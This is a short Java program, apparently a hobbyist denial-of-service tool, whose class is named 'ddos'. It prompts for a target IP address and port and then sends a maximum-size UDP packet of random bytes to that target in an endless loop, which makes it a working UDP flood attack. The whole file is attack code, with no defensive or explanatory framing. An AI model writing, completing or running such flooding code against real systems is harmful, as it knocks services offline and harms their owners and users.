import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;
import java.util.Scanner;

public class ddos {
    public static void main(String[] args) {
        Scanner scan = new Scanner(System.in);
        SecureRandom secureRandom = new SecureRandom();
        int numBytes = 65507;
        byte[] randomBytes = new byte[numBytes];
        secureRandom.nextBytes(randomBytes);

        System.out.print("Enter an IP address : ");
        String input = scan.nextLine();
        try {
            DatagramSocket socket = new DatagramSocket();

            InetAddress serverAddress = InetAddress.getByName(input);

            System.out.println("Masukkan Port : ");
            int serverPort = scan.nextInt();

            DatagramPacket sendPacket = new DatagramPacket(randomBytes, randomBytes.length, serverAddress, serverPort);
            
            while (true) {
                socket.send(sendPacket);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        scan.close();
    }
}
